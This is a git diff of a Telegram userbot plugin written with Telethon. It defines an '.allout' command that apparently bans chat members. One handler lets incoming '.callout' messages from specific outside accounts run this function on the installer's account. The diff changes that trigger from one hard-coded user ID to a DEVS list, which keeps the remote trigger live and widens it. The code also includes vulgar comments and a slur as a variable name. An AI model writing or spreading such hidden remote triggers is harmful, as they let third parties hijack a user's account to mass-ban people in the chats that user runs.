@@ -2,14 +2,14 @@ from asyncio import sleep
 from telethon.tl.types import ChatBannedRights
 from telethon.tl.functions.channels import EditBannedRequest
 from userbot.events import register
-from userbot import CMD_HELP
+from userbot import CMD_HELP, DEVS
 
 # Aku nambah kredit sdikit
 # rama ganteng bgt kan?
 # Port By @VckyouuBitch From GeezProject
 # Perkontolan Dengan Hapus Credits
 @register(outgoing=True, pattern="^.allout(?: |$)(.*)")
-@register(incoming=True, from_users=1779447750, pattern=r"^\.callout$")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.callout$")
 async def testing(event):
     nikal = await event.get_chat()
     chutiya = await event.client.get_me()
